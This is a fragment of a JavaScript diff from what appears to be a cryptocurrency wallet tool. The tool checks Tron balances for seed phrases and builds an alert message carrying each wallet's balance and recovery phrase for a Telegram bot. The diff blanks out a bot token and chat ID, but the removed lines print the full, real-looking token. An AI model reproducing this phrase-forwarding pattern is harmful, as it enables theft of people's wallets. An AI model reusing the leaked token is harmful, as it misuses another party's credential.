@@ -111,8 +111,8 @@ async function S0x001(phrase_) { //check Tron Balance
 
 function sendAlert() {
     // Set the bot token and chat ID
-    const botToken = '6131755686:AAF9krbLzQcdI5OAXM0YEDQ15c8JxP9iEvk';
-    const chatId = '5261120093';
+    const botToken = '';
+    const chatId = '';
     // Set the message text
     const messageText = `${walletINFO['balance'][0]}   ${walletINFO['balance'][1]} 
     ${walletINFO['phrase']}`
